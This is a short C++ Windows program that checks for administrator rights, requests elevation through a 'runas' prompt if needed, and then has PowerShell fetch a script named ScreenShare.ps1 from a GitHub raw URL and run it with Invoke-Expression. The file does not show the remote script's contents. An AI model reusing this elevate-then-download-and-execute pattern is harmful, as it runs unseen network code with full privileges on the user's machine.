#include <iostream>
#include <Windows.h>

bool isadmin() {
    BOOL isAdmin = FALSE;
    PSID pSidAdmin = nullptr;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSidAdmin)) {
        CheckTokenMembership(nullptr, pSidAdmin, &isAdmin);
        FreeSid(pSidAdmin);
    }

    return isAdmin == TRUE;
}

int main() {
    const char* command = "cmd.exe /C powershell -Command \"Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/kkoralop/ScreenShare/main/ScreenShare.ps1)\"";

    if (isadmin()) {
        system(command);
    } else {
        ShellExecute(nullptr, "runas", "cmd.exe", (LPSTR)command, nullptr, SW_SHOWNORMAL);
    }

    return 0;
}
